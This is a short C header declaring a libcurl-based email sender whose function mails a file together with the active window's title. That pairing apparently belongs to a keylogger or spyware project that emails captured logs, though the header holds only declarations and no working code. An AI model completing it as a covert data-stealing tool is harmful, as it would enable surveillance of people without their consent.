#ifndef SendEmail_H_SENTRY
#define SendEmail_H_SENTRY

#include <curl/curl.h>
#include "file_handler.h"

typedef struct {
    CURL *curl;
    struct curl_slist *recipients;
} EmailSender;

int EmailSender_init(EmailSender *sender);
int send_file_via_email(EmailSender *sender, FileHandler *fh, char **active_window);
void EmailSender_cleanup(EmailSender *sender);

#endif